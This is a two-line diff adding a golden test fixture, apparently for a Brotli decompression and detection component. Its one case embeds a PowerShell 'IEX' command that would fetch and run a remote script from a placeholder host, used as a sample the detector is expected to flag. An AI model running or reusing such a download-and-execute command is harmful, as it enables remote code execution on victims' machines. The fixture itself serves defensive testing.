@@ -1,0 +1,2 @@
+# brotli-decompress · Golden Fixtures · RC3.2a
+{"case_id": "brotli-plain-ps", "description": "Brotli stream \u2192 PowerShell IEX", "input": "\u008b\u0013\u0080powershell.exe -c \"IEX http://a.b/x.ps1\"\u0003", "detect_min_confidence": 0.3, "expected_output_contains": ["powershell", "IEX"]}
